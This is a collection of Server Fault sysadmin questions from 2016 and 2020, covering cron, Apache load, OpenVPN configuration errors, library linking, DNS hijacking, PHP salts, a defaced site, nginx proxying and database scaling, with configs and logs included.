# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
MAILTO=""""
* * * * * /usr/bin/python3 /var/scripts/monitoring/load.py &gt; /var/log/cron.log
</code></pre>

<p>The problem is that the cron log file is always empty, meaning the script is not executed, but when I run ""/usr/bin/python3 /var/scripts/monitoring/load.py"" manually in the CLI, it is all fine.</p>
","<cron><python>","2016-10-01 08:28:19"
"806598","ISO or VHD for MCSA exam training?","<p>First, please excuse me if my question is not at the right place.</p>

<p>I'd like to pass the Windows 2012 MCSA exams, and I've chosen some books.
But, is there a way to get a Windows Server license or ISO ou whatever just for training ?</p>

<p>Thanks,</p>

<p>Jérémie</p>
","<windows-server-2012>","2016-10-02 09:48:14"
"806627","Apache hogs cpu, most connections in waiting status","<p>a few days ago my Apache server randomly started hogging the CPU during which time the site becomes sluggish and unresponsive. </p>

<p>Here is what mod_status shows during an incident:</p>

<ul>
<li>Nearly all connections are in the waiting state</li>
<li>A few connections are in the Keep-Alive state. All of them have Req column values (Milliseconds required to process most recent request) between 15 and 40 seconds, which is 10-20x longer than usual</li>
<li>During this time, running top command shows 100% usage of all 4 CPUs, with 5-7 Apache child processes on top, taking 10-40% percent CPU each</li>
</ul>

<p>Each incident lasts 15-30 minutes and then the situation returns to normal for a while, until another incident occurs. </p>

<p>Server configuration and stats:</p>

<ul>
<li>Digital Ocean droplet with 4 CPU's, 8 GB RAM</li>
<li>LAMP stack running a Wordpress site, about 40K hits per day (XMLRPC protected, wp-login protected)</li>
<li>MySQL performance appears normal (slow query logging on, nothing unusual)</li>
</ul>

<p>Any advice on debugging this would be appreciated as I don't even know where to start.</p>

<hr>

<pre>
Server Version: Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11
Server MPM: prefork
Server Built: Jul 24 2015 17:25:11
Current Time: Sunday, 02-Oct-2016 08:41:09 EDT
Restart Time: Sunday, 02-Oct-2016 07:55:53 EDT
Parent Server Config. Generation: 1
Parent Server MPM Generation: 0
Server uptime: 45 minutes 15 seconds
Server load: 105.26 38.36 22.87
Total accesses: 32705 - Total Traffic: 367.2 MB
CPU Usage: u455.08 s51.66 cu0 cs0 - 18.7% CPU load
12 requests/sec - 138.5 kB/second - 11.5 kB/request
144 requests currently being processed, 39 idle workers
_WWWWWWWWW_WKWWWWW__WWWW._WW.WWWW___W.WWWW__WWW_W_WWWW_WW.W_WWWW
_W.WCWW_WW.WKWWWWWWWWW_WWWKW.W_K_.KW__K.W._WWWWW__WWWWWWWWW._WKW
WWWK.WW_WW__WWWWWWWW__WWW_WWWW_WWWWWW_._WWWKK___WWW_WWWWWWWWWWWW
_.W..WW.
Scoreboard Key:
""_"" Waiting for Connection, ""S"" Starting up, ""R"" Reading Request,
""W"" Sending Reply, ""K"" Keepalive (read), ""D"" DNS Lookup,
""C"" Closing connection, ""L"" Logging, ""G"" Gracefully finishing,
""I"" Idle cleanup of worker, ""."" Open slot with no current process

</pre>
","<apache-2.4><wordpress>","2016-10-02 13:15:13"
"1016757","how to copy all chown's and chmod's of files from an remote system to an other system","<p>i want to copy all files (/var/www/html) from system A (debian) to system B (debian) without loosing all chown and chmod configurations. there are more then 200.000 files in the folder and many of them have special rule configurations. it is really hard to change all files by hand and i also didnt write an extern file to know which file has a special rule to write an c file to do that for me. has some admins experiences with that and some tips for me how to hande that in future correctly? br</p>
","<debian><operating-system>","2020-05-12 09:07:16"
"1016774","OpenVPN Server Routing/Firewall Settings","<p>Short Desc: Connecting Rasp pi 3 as client to data center dedicated server for pulling backups over rsync. Getting ""ERROR: Cannot ioctl TUNSETIFF tun0: Device or resource busy (errno=16)""</p>

<p>Long Desc: After configuration, I've been trying to use my client to connect to the server, but I am getting the following from my client. I think I may have messed something up setting the before.rules in UFW.</p>

<p>Please note the following:</p>

<ul>
<li>I do not have topology enabled on the server</li>
<li>I am using this for rsync only, no internet traffic, etc</li>
<li>Not sure why the server tries routing through 10.255.255.1</li>
<li>dh /etc/openvpn/dh2048.pem only on server, not on client</li>
</ul>

<pre><code>Tue May 12 09:54:40 2020 TCP/UDP: Preserving recently used remote address: [AF_INET]Server.IP.address:1194
Tue May 12 09:54:40 2020 Socket Buffers: R=[163840-&gt;163840] S=[163840-&gt;163840]
Tue May 12 09:54:40 2020 UDP link local: (not bound)
Tue May 12 09:54:40 2020 UDP link remote: [AF_INET]Server.IP.address:1194
Tue May 12 09:55:40 2020 TLS Error: TLS key negotiation failed to occur within 60 seconds (check your network connectivity)
Tue May 12 09:55:40 2020 TLS Error: TLS handshake failed
</code></pre>

<p>So I checked the openvpn.log and it shows:</p>

<pre><code>Tue May 12 05:40:42 2020 OpenVPN 2.4.4 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2019
Tue May 12 05:40:42 2020 library versions: OpenSSL 1.1.1  11 Sep 2018, LZO 2.08
Tue May 12 05:40:42 2020 Diffie-Hellman initialized with 2048 bit key
Tue May 12 05:40:42 2020 Outgoing Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
Tue May 12 05:40:42 2020 Incoming Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
Tue May 12 05:40:42 2020 ROUTE_GATEWAY 10.255.255.1
Tue May 12 05:40:42 2020 ERROR: Cannot ioctl TUNSETIFF tun0: Device or resource busy (errno=16)
Tue May 12 05:40:42 2020 Exiting due to fatal error
</code></pre>

<p>So here's all the config data.</p>

<p>Server (notice topology is not enabled, didn't think it had to be):</p>

<pre><code>;local a.b.c.d
port 1194
proto udp
dev tun0
ca /etc/openvpn/keys/ca.crt
cert /etc/openvpn/keys/server.crt
key /etc/openvpn/keys/server.key  # This file should be kept secret
dh /etc/openvpn/dh2048.pem
server 10.8.0.0 255.255.255.0
ifconfig-pool-persist /var/log/openvpn/ipp.txt
keepalive 10 120
tls-auth /etc/openvpn/keys/ta.key 0 # This file is secret
cipher AES-256-CBC
user nobody
group nogroup
persist-key
persist-tun
status /var/log/openvpn/openvpn-status.log
log-append  /var/log/openvpn/openvpn.log
verb 3
explicit-exit-notify 1
;dev-node MyTap
;topology subnet
;server-bridge 10.8.0.4 255.255.255.0 10.8.0.50 10.8.0.100
;server-bridge
;push ""route 192.168.10.0 255.255.255.0""
;push ""route 192.168.20.0 255.255.255.0""
;client-config-dir ccd
;route 192.168.40.128 255.255.255.248
;client-config-dir ccd
;route 10.9.0.0 255.255.255.252
;learn-address ./script
;push ""redirect-gateway def1 bypass-dhcp""
;push ""dhcp-option DNS 208.67.222.222""
;push ""dhcp-option DNS 208.67.220.220""
;client-to-client
;duplicate-cn
;log         /var/log/openvpn/openvpn.log
;mute 20
;compress lz4-v2
;push ""compress lz4-v2""
;comp-lzo
;max-clients 100

</code></pre>

<p>Client:</p>

<pre><code>client
dev tun0
proto udp
remote server.ip.address 1194
resolv-retry infinite
nobind
user nobody
group nogroup
persist-key
persist-tun
ca /etc/openvpn/keys/ca.crt
cert /etc/openvpn/keys/backupclient.crt
key /etc/openvpn/keys/backupclient.key
remote-cert-tls server
tls-auth /etc/openvpn/keys/ta.key 1
cipher AES-256-CBC
verb 3
;dev-node MyTap
;proto tcp
;http-proxy-retry
;http-proxy [proxy server] [proxy port #]
;mute-replay-warnings
;remote my-server-2 1194
;remote-random
;mute 20
</code></pre>

<p>Server Netstat:</p>

<pre><code>netstat -uapn | grep openvpn
udp   192768      0 0.0.0.0:1194            0.0.0.0:*                           27185/openvpn
</code></pre>

<p>/etc/default/ufw</p>

<pre><code>DEFAULT_FORWARD_POLICY=”ACCEPT”
</code></pre>

<p>/etc/ufw/before.rules</p>

<pre><code># START OPENVPN RULES
# NAT table rules
#nat
:POSTROUTING ACCEPT [0:0]
# Allow traffic from OpenVPN client to eth0
-A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE
COMMIT
# END OPENVPN RULES
</code></pre>

<p>ifconfig shows my device is eth0, and here is the tun0 interface that was started</p>

<pre><code>tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu 1500
        inet 10.8.0.1  netmask 255.255.255.255  destination 10.8.0.2
        inet6 fe80::7af3:d22d:86c3:1cd7  prefixlen 64  scopeid 0x20&lt;link&gt;
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3  bytes 144 (144.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre>

<p>Here's the openvpn.log file showing a connection attempt, and I have not been able to get this to come up again (perhaps because the ip route changed to 10.8.0.2</p>

<pre><code>Tue May 12 05:24:36 2020 OpenVPN 2.4.4 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2019
Tue May 12 05:24:36 2020 library versions: OpenSSL 1.1.1  11 Sep 2018, LZO 2.08
Tue May 12 05:24:36 2020 Diffie-Hellman initialized with 2048 bit key
Tue May 12 05:24:36 2020 ROUTE_GATEWAY 10.255.255.1
Tue May 12 05:24:36 2020 TUN/TAP device tun0 opened
Tue May 12 05:24:36 2020 TUN/TAP TX queue length set to 100
Tue May 12 05:24:36 2020 do_ifconfig, tt-&gt;did_ifconfig_ipv6_setup=0
Tue May 12 05:24:36 2020 /sbin/ip link set dev tun0 up mtu 1500
Tue May 12 05:24:36 2020 /sbin/ip addr add dev tun0 local 10.8.0.1 peer 10.8.0.2
Tue May 12 05:24:36 2020 /sbin/ip route add 10.8.0.0/24 via 10.8.0.2
Tue May 12 05:24:36 2020 Could not determine IPv4/IPv6 protocol. Using AF_INET
Tue May 12 05:24:36 2020 Socket Buffers: R=[212992-&gt;212992] S=[212992-&gt;212992]
Tue May 12 05:24:36 2020 UDPv4 link local (bound): [AF_INET][undef]:1194
Tue May 12 05:24:36 2020 UDPv4 link remote: [AF_UNSPEC]
Tue May 12 05:24:36 2020 GID set to nogroup
Tue May 12 05:24:36 2020 UID set to nobody
Tue May 12 05:24:36 2020 MULTI: multi_init called, r=256 v=256
Tue May 12 05:24:36 2020 IFCONFIG POOL: base=10.8.0.4 size=62, ipv6=0
Tue May 12 05:24:36 2020 IFCONFIG POOL LIST
Tue May 12 05:24:38 2020 Client.Ip.Address:42834 TLS: Initial packet from [AF_INET]Client.Ip.Address:42834, sid=3a994a10 3f4eea3d
Tue May 12 05:24:38 2020 Client.Ip.Address:42834 TLS Error: reading acknowledgement record from packet
Tue May 12 05:24:48 2020 Client.Ip.Address:53172 TLS: Initial packet from [AF_INET]Client.Ip.Address:53172, sid=9af273bb 28096ff1
Tue May 12 05:24:48 2020 Client.Ip.Address:53172 TLS Error: reading acknowledgement record from packet
Tue May 12 05:24:49 2020 Client.Ip.Address:46930 TLS: Initial packet from [AF_INET]Client.Ip.Address:46930, sid=26c7325a 33df4e52
Tue May 12 05:24:49 2020 Client.Ip.Address:46930 VERIFY OK: depth=1, C=US, ST=WA, L=City, O=CompanyName, OU=Developer, CN=DS CA, name=EasyRSA, emailAddress=CompanyName@gmail.com
Tue May 12 05:24:49 2020 Client.Ip.Address:46930 VERIFY OK: depth=0, C=US, ST=WA, L=City, O=CompanyName, OU=Developer, CN=backupclient, name=EasyRSA, emailAddress=CompanyName@gmail.com
Tue May 12 05:24:49 2020 Client.Ip.Address:46930 peer info: IV_VER=2.4.4
Tue May 12 05:24:49 2020 Client.Ip.Address:46930 peer info: IV_PLAT=linux
Tue May 12 05:24:49 2020 Client.Ip.Address:46930 peer info: IV_PROTO=2
Tue May 12 05:24:49 2020 Client.Ip.Address:46930 peer info: IV_NCP=2
Tue May 12 05:24:49 2020 Client.Ip.Address:46930 peer info: IV_LZ4=1
Tue May 12 05:24:49 2020 Client.Ip.Address:46930 peer info: IV_LZ4v2=1
Tue May 12 05:24:49 2020 Client.Ip.Address:46930 peer info: IV_LZO=1
Tue May 12 05:24:49 2020 Client.Ip.Address:46930 peer info: IV_COMP_STUB=1
Tue May 12 05:24:49 2020 Client.Ip.Address:46930 peer info: IV_COMP_STUBv2=1
Tue May 12 05:24:49 2020 Client.Ip.Address:46930 peer info: IV_TCPNL=1
Tue May 12 05:24:50 2020 Client.Ip.Address:46930 Control Channel: TLSv1.3, cipher TLSv1.3 TLS_AES_256_GCM_SHA384, 2048 bit RSA
Tue May 12 05:24:50 2020 Client.Ip.Address:46930 [backupclient] Peer Connection Initiated with [AF_INET]Client.Ip.Address:46930
Tue May 12 05:24:50 2020 backupclient/Client.Ip.Address:46930 MULTI_sva: pool returned IPv4=10.8.0.6, IPv6=(Not enabled)
Tue May 12 05:24:50 2020 backupclient/Client.Ip.Address:46930 MULTI: Learn: 10.8.0.6 -&gt; backupclient/Client.Ip.Address:46930
Tue May 12 05:24:50 2020 backupclient/Client.Ip.Address:46930 MULTI: primary virtual IP for backupclient/Client.Ip.Address:46930: 10.8.0.6
Tue May 12 05:24:50 2020 Client.Ip.Address:53172 TLS Error: reading acknowledgement record from packet
Tue May 12 05:24:51 2020 backupclient/Client.Ip.Address:46930 PUSH: Received control message: 'PUSH_REQUEST'
Tue May 12 05:24:51 2020 backupclient/Client.Ip.Address:46930 SENT CONTROL [backupclient]: 'PUSH_REPLY,route 10.8.0.1,topology net30,ping 10,ping-restart 120,ifconfig 10.8.0.6 10.8.0.5,peer-id 2,cipher AES-256-GCM' (status=1)
Tue May 12 05:24:51 2020 backupclient/Client.Ip.Address:46930 Data Channel: using negotiated cipher 'AES-256-GCM'
Tue May 12 05:24:51 2020 backupclient/Client.Ip.Address:46930 Outgoing Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
Tue May 12 05:24:51 2020 backupclient/Client.Ip.Address:46930 Incoming Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
Tue May 12 05:24:54 2020 Client.Ip.Address:42834 TLS Error: reading acknowledgement record from packet
Tue May 12 05:24:54 2020 Client.Ip.Address:53172 TLS Error: reading acknowledgement record from packet
</code></pre>
","<firewall><openvpn><ufw><rules>","2020-05-12 10:52:15"
"1016806","uninstall / deactivate ssh client only on linux server","<p>How can I uninstall or completely deactivate ssh client only. I still need server to log in.
I just wonna pretend ssh brute force attacks commming out from my server.
Thanks in advance.</p>
","<linux><ssh><brute-force-attacks>","2020-05-12 14:54:12"
"806708","Compiling GnuPG links gpg2 to /lib instead of /usr/local/lib/","<p>Occasionally I have to install new packages on servers.  If I'm lucky, I can find an RPM, otherwise, I get to bang my head on the wall and attempt to compile a package.</p>

<p>This time I get to compile GnuPG to get version 2.1.15. So I download all the dependent libraries, run  configure &amp;&amp; make install, lastly I repeat for the gnupg-2.1.15 package itself, and all goes well, and make puts everything in /usr/local/ including libraries and binaries. Feeling lucky, I check the version:</p>

<pre><code>$ /usr/local/bin/gpg2 --version
gpg: Fatal: libgcrypt is too old (need 1.7.0, have 1.6.6)
</code></pre>

<p>Oops.  What happened, so I check the linked libraries:</p>

<pre><code>$ ldd /usr/local/bin/gpg2
linux-vdso.so.1 (0x00007fff15db4000)
libgcrypt.so.20 =&gt; /lib64/libgcrypt.so.20 (0x00007fcab5431000)
libgpg-error.so.0 =&gt; /lib64/libgpg-error.so.0 (0x00007fcab521d000)
libassuan.so.0 =&gt; /lib64/libassuan.so.0 (0x00007fcab5009000)
libc.so.6 =&gt; /lib64/libc.so.6 (0x00007fcab4c47000)
libdl.so.2 =&gt; /lib64/libdl.so.2 (0x00007fcab4a43000)
/lib64/ld-linux-x86-64.so.2 (0x00005615f5c77000)
</code></pre>

<p>Ugh, the old built-in-system libraries have been linked. I don't compile software much, so I'm stuck here trying to figure out how to tell gcc via configure (or other?) to link the dependent libraries which were just installed in /usr/local/lib/</p>

<p>This is my configure command for gnupg-2.1.15:</p>

<pre><code>./configure --prefix=/usr/local --with-libgpg-error-prefix=/usr/local/\
--with-libgcrypt-prefix=/usr/local --with-libassuan-prefix=/usr/local\
--with-ksba-prefix=/usr/local --with-npth-prefix=/usr/local
</code></pre>

<p>Running this on Fedora 24 with latest updates &amp; kernel installed and gcc 6.2.1.</p>

<p>Thanks for taking the time to consider my issue.</p>
","<fedora><gcc><libraries><gnupg>","2016-10-03 07:15:52"
"806713","ISP is DNS Hijacking. Updated DNS to Google OpenDNS, but still hijacked","<p>I'm visiting India, and saw that their main provider, Airtel, limits the entirety of the internet to just a small handful of websites festooned with their own advertisements, and annoying redirects.</p>

<p>I'm trying to come up with a simple and easy way for the Indian people to have access to freedom of speech and information.</p>

<p>Thus so far, I've updated the DNS records to Google's Public DNS, which allows me to ping, dnslookup, and curl websites such as ""askubuntu.com"" which are otherwise blocked by Airtel in India.</p>

<p>But if I were to go to them via a browser ( all plugins uninstalled, and with freshly reinstalled browsers ), I am still blocked from accessing the majority of the internet.</p>

<p>Would anyone know what I could do at this point to circumvent a DNS' hacking attempts? A VPN works fine, but I thought it would be more practical to be able to wire something independent of a 3rd party.</p>

<p>I'm using Windows, but am also interested in a Unix solution.</p>

<p>Cheers!</p>
","<domain-name-system><redirect><hacking><isp><google-public-dns>","2016-10-03 07:39:56"
"1016948","crypt(): No salt parameter was specified. You must use a randomly generated salt and a strong hash function to produce a secure hash function","<p>I'm getting the following password error. I have PHP 7.2 variant(to php version 5.5 does not appear to me this problem ), the following code :</p>

<pre><code>function make_key($length)
{
    $valid_chars = 'abcdefghijkilmnoprstwxyzABCDEFGHIJKMNOPRSTWXYZIL0123456789';
    $random_string = """";
    $num_valid_chars = strlen($valid_chars);
    for ($i = 0; $i &lt; $length; $i++)
    {
        $random_pick = mt_rand(1, $num_valid_chars);
        $random_char = $valid_chars[$random_pick-1];
        $random_string .= $random_char;
    }
    return $random_string;
}

/**
 * Generate random coupon code
 * @param int $length
 * @return string
 */
function generate_code($length=6)
{
    // Generate array range
    $range = array_merge(range('A', 'Z'), range(0, 9));

    $keyCount = count($range) - 1;
    $code = '';
    for ($i = 0; $i &lt; $length; $i++) {
        $rand = mt_rand(0, $keyCount);
        $code .= $range[$rand];
    }
    return $code;
}

/**
 * Generates a random SHA-256 salt ($5$)
 * @return string
 */
function generate_salt() {
    return '$5$'.substr(crypt(uniqid()), 3, 13);
}
</code></pre>

<p>i eperire appears to : return '$5$'.substr(crypt(unigid()), 3, 13);
 , can you help me how I can strengthen this code so I don't have any more problems?
Thanks</p>
","<php><java><php5><php7><javascript>","2020-05-13 12:47:43"
"806898","Why PHP script execution gets serialized?","<p>I am using CakePHP3 -  Nginx + PHP7 on Windows8.</p>

<p>I have spawned multiple php-cgi processes for parralel execution. However what I have noticed, that in case of multiple concurrent ajax request from single host, request gets serialized. 
I can confirm that there are some CPU usage spikes on multiple php-cgi instances, so it looks like requests are handled in parallel, but still they are serialized somehow. Any ideas what is serializing the calls?</p>

<p>Script does a simple repeatable and fast select from the DB that returns single row each. </p>

<p>Here is request timeline:</p>

<p><a href=""https://i.sstatic.net/O5aP5.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/O5aP5.png"" alt=""enter image description here""></a></p>
","<nginx><php>","2016-10-04 06:19:24"
"1016981","Why choose AWS RDS (or any cloud RDS) instead of standalone MySQL?","<p>I want some assistance to help me understand which solution to choose. I have a Web App with around 1000 active monthly clients, and a database of 40GB size (unzipped). At the moment I am hosting MySQL server on a dedicated root server, with 64GB RAM, 4TB HDD, and Intel i7 CPU.</p>

<p>The modern trend nowadays is everyone to switch to Cloud RDS(either AWS, Azure, GCP, DigitalOcean etc). What are the benefits of hosting your DB to cloud providers?</p>

<p>Ok i can understand that in case of disaster you will have the option to revert easily in a working state, however is that all? The pricing is way higher so you can ""just have a restore back in 10-20 minutes"".</p>

<p>Consider your answer having in mind that I have a simple web app and not complex corporate procedures/scenarios!</p>
","<mysql><amazon-web-services><rds>","2020-05-13 15:35:38"
"1017045","My website got defaced, how to find possible vulnerability?","<p>Recently my internal company site got defaced, is it self hosted site on a VPS, I suspect it has something to do with outdated program we use (e. g. php-5.5.9 and apache 2.4), and also it ran off Ubuntu 14.04.</p>

<p>Weirdly it doesn't occur on the main page, rather the deface page shows up when I tried to submit form. I have check <code>fail2ban</code> and <code>ufw</code> and it doesn't seem there was any strange activity.</p>

<p>What the best way to proceed the problem ? Is there any website vulnerability scanner I can use ?</p>
","<security><apache2><website>","2020-05-14 02:00:10"
"807030","Remove Cent OS 7 from a server","<p>I have a server that has CentOS 6.5 and 7 installed on separate partition. I would like to remove the CentOS 7 version. How can I accomplish this?</p>
","<linux><centos7>","2016-10-04 17:07:17"
"807076","how can we manage multiple servers from center place","<p>Please let me explain how can we manage multiple  server from a centeral point. actually I need an application which runs on multiple servers with same name database. Now I want to centerlized my database from a single location.
please let me suggest. Developers have used sql server for my application</p>
","<windows-server-2008><web-server><sql>","2016-10-04 20:10:16"
"1017207","Is there a real technical difference between Transactional e-mail and Marketing / Bulk email?","<p>There are a lot of articles about differences between <em>Transactional e-mail</em> and <em>Marketing e-mails</em> (or bulk e-mails). I understand the business difference between these two, but is there any <strong>real technical difference</strong> between these two types of e-mails? I've been reading RFCs (like RFC 821 and RFC5321) but they not seem to be defining any difference between different mail types.</p>

<p>So is this just marketing bulls__t or are there actually any real technical differences between transactional e-mail and bulk / marketing e-mails?</p>
","<email><email-server><spam-marked>","2020-05-14 20:42:03"
"1017259","Is it a good idea to use a virtual machine as an external facing code repository server","<p>I've already asked this question <a href=""https://superuser.com/questions/1549164/is-it-a-good-idea-to-use-a-virtual-machine-as-an-external-facing-code-repository"">here</a> but it died out with no conclusive answer. </p>

<h2>Original question:</h2>

<p>I've set up (installed git/configured certs (disabled password login)/synced repos) a debian box vm with a bridged adapter. Now it's running on Windows server 2016; inbound connections are blocked by an external firewall.</p>

<h2>Is it a good idea to add a firewall exception for the vm so that outsourcing teams can work on the repos directly?</h2>

<p>Am I missing any security related stuff?   </p>
","<security><virtualization><virtual-machines>","2020-05-15 08:17:52"
"1017274","What are the disadvantages if routers (layer 3) didn't existed?","<p>I'm new to networking and I'm trying my best to understand some concepts. Therefore, if routers never existed and we had only layer 2 switches, what would be the problems that arise and cannot be solved by the switch ? Through this question, I'm trying to get to understand for which reasons it was necessary to create the router. </p>

<p>Regards</p>
","<networking><router><switch>","2020-05-15 10:41:43"
"1017284","NGINX as a reverse proxy based on domain / URL","<p>I have three servers available behind a firewall and want to set up NGINX on one (port 80/443) to handle all http traffic to and from the others.  For the sake of simplicity, the NGINX box is at:
10.0.0.10
and the other servers are at:
10.0.0.11 and 10.0.0.12</p>

<p>I have Tomcat serving http on all 3 servers on port 8080.
I would like to redirect any incoming traffic destined for <a href=""https://server1.myservers.com"" rel=""nofollow noreferrer"">https://server1.myservers.com</a> to Tomcat on 10.0.0.10, <a href=""https://server2.myservers.com"" rel=""nofollow noreferrer"">https://server2.myservers.com</a> to Tomcat on 10.0.0.11 and <a href=""https://server3.myservers.com"" rel=""nofollow noreferrer"">https://server3.myservers.com</a> to Tomcat on 10.0.0.12.</p>

<p>What is the correct NGINX configuration for that?  I realise there's more to it with a complete setup for redirection to Tomcat, my main interest is how to configure the proxy pass entries in the nginx.conf to look at the URL and make a call based on that.</p>

<p>Thanks in advance!</p>
","<nginx><reverse-proxy>","2020-05-15 11:26:24"
"807129","real time sync for file sharing servers","<p>I run a file sharing site, which is quickly growing in popularity.</p>

<p>Right now my web app is on AWS elastic beanstalk so of course scales up beautifully, however my files are currently all served from a single dedicated box. The box is starting to max out its 1gbps connection, so i'm trying to research how to scale the file storage up too.</p>

<p>NB: I also have all the file synced to S3, but its far too costly to serve them from there due to S3 bandwidth charges. My dedicated box is unmetered.</p>

<p>So far I've seen talk of DRBD and Lsyncd, but neither feel like what I'm looking for.</p>

<p>Any advice on the best setup for running multiple file storage linux boxes in real time sync behind a load balancer would be GREATLY appreciated.</p>

<p>P.S - worth noting my ideal scenario is they are all in sync at all times, so if a file is added to one box, it is synced across all boxes. Same for when a file is deleted.</p>
","<load-balancing><filesystems><linux-networking><file-sharing><synchronization>","2016-10-05 03:06:57"
"807271","Accessing VirtualBox share from IIS","<p>I'm trying to have IIS 8.5 access a VirtualBox shared folder.</p>

<p>The physical path for the website was changed to <code>\\VBOXSVR\application</code>. Now, when I open localhost, I get the following error message:</p>

<p>HTTP Error 500.19 Internal Server Error
Cannot read configuration file.</p>

<p>I assume that IIS does not have the permissions to access the network share, is that right? How can I correct that problem?</p>
","<windows-server-2012-r2><network-share><virtualbox><iis-8.5>","2016-10-05 14:49:29"
"807373","Server and Database layout","<p><strong>MongoDB vs MySQL, Master-Master or Master-Slave?</strong></p>

<p>I’m currently developing a service in Laravel for online learning. Basically imagine <a href=""https://www.memrise.com/"" rel=""nofollow noreferrer"">Memrise.com.</a></p>

<p>Now, my users are going to be doing lots of reads and writes. The writes are going to be small, with 4 ints, 1 string (approx. 30 chars) and a bool (statistics for answered questions by my users).
The reads on the other hand will at most be texts of at most 1000 words, together with 1 question (~20 words) and 4 options (~20 words). The PHP is not very advanced. I have implemented SuperMemo 2, however it’s not going to be much more resource intensive than that.</p>

<p>When I’m launching the site, I’d like to have the possibility for 500 simultaneous users (reading and writing simultaneously), and while I do have moderate experience in managing servers as a hobby, I’ve never actually launched anything for production.</p>

<p>The most important factor in the server setup that I’ll be starting off with is that it should be very scalable. I’m (probably) going to be using Linode because of their location, performance and reputation. My budget to start off with is going to be $120/mo (for 500 users) but I want it to be able to scale horizontally easily and fast if needed.</p>

<p>What I’m actually wondering is what my base server setup should look like (hopefully with the capability of being able to withstand 500 simultaneous users). Should I use a MongoDatabase for the user answers(writes) and a MySQL DB for their accounts? Should I go with just MySQL and some sort of replication? Should I use Master-Master or Master-Slave? What should the Redis setup look like? How should I divide my resources to get the maximum bang for the buck?</p>

<p>I’m currently considering the following setup:</p>

<ul>
<li>1 Linode Load-balancer ($20)</li>
<li>2 Nginx + PHP-FPM backends (2 x $20)</li>
<li>2 MySQL Servers (2 x $20)</li>
<li>2 Redis Cache Servers (2x $10)</li>
</ul>

<p>I’d like to be able to just add on more servers as needed without any down time (I realize that the Load balancer is a weak spot but that’s fine).</p>

<p>Now, later on I’ll be able to spot weak links in my setup but I just want to make sure that I’m prepared in the beginning for decent load.</p>

<p>Thanks in advance,
Axel</p>
","<linux><performance><configuration><load-balancing><scalability>","2016-10-05 22:53:45"
"1017597","Why SQL query does not work with subquery but works with comma seperated list?","<p>I have query:</p>

<pre><code>SELECT p.[id], p.[page_file], p.[page_header], p.[page_icon] 

FROM [dbo].[setup_pages] AS p 

WHERE CONVERT(nvarchar(100),p.[id]) IN ( SELECT l.[access] FROM [dbo].[licenses] AS l )
</code></pre>

<p>It does not return error and no data are returned. </p>

<p><code>SELECT l.[access] FROM [dbo].[licenses] AS l</code> returns 3 lines:<br>
1) 8,9,15,4,13,11,5,14,12,16<br>
2) 20,19<br>
3) 20,8,9,15,4,13,11,5,14,12,16<br></p>

<p>and if i run query like this:</p>

<pre><code>SELECT p.[id], p.[page_file], p.[page_header], p.[page_icon] 

FROM [dbo].[setup_pages] AS p 

WHERE CONVERT(nvarchar(100),p.[id]) IN ( 8,9,15,4,13,11,5,14,12,16 )
</code></pre>

<p>It does work. .. Where is my issue?</p>
","<sql>","2020-05-18 10:01:36"
"807384","PuTTY slow connecting to Linux SSH server","<p>When connecting to a Linux SSH server using PuTTY, the PuTTY log shows 2 authentication attempts. The first attempt uses ""root"" as the username and no password. ""none"" is displayed in the first packet, meaning no password was used. The connection fails because the Linux SSH server is configured to only authenticate connections that have a password or public key. The second attempt uses ""root"" as the username and ""SECRET"" as the password. Access is granted because ""root"" and ""SECRET"" are a valid username/password for the Linux SSH server.</p>

<p><a href=""https://i.sstatic.net/qpoQ9.png"" rel=""noreferrer""><img src=""https://i.sstatic.net/qpoQ9.png"" alt=""enter image description here""></a></p>

<p>After clicking on the Open button in PuTTY, immediately the prompt to enter username ""root"" appears. After entering username ""root"", it takes about 8 seconds for the password prompt to appear. I am certain the cause of this 8 second delay is because the client and server are busy with the first authentication attempt that has ""none"" and no password. After entering password SECRET and pressing enter, access is granted immediately.</p>

<p><a href=""https://i.sstatic.net/FgSKA.png"" rel=""noreferrer""><img src=""https://i.sstatic.net/FgSKA.png"" alt=""enter image description here""></a></p>

<p>I am not certain why PuTTY first attempts to connect with username ""root"" and no password. Is there some way to configure PuTTY to not make the first attempt with username ""root"" and no password. </p>
","<ssh><authentication><login><putty>","2016-10-06 01:36:40"
"807458","How does a server (e.g. web) manage multiple request/connections?","<p>I read that apache has a solution to create new thread per new request, but I still have some questions. </p>

<p>How is possible that one server can manage thousands (even a milion connection - depends from the app) at the same time?</p>

<p>Does this depends from the CPU? RAM? Bandwidth?</p>

<p>When we say ""at the same time"" (or when apache create new thread), we mean that these connections are executed in parallel/simultaneus? or they are concurrent?</p>

<p>Or does this depends from the server itself? e.g. if the server is multicore, the server can execute even in parallel (each thread in his core), even cuncurrent (several threads in one core concurrently).  </p>

<p>If I want to handle thousands connection concurrently for one web app, what do I need to do? Buy more bandwidth? Invenst in CPU?     </p>

<p>I am new in this and some good explanation would be great. </p>
","<web-server><threads><multi-threading><concurrency>","2016-10-06 11:33:51"
"1017739","Make reliable and fast server for Node.js chat based application","<p>Good day everyone.</p>

<p>We have a serious problem with server, Our dedicated server is not responding with high traffic, server response goes too slow whenever 2500 daily active users. Total users are more than 80000.</p>

<p>We have a chat based application for both iOS and Android and API's are written in Node.js and database used MongoDB.</p>

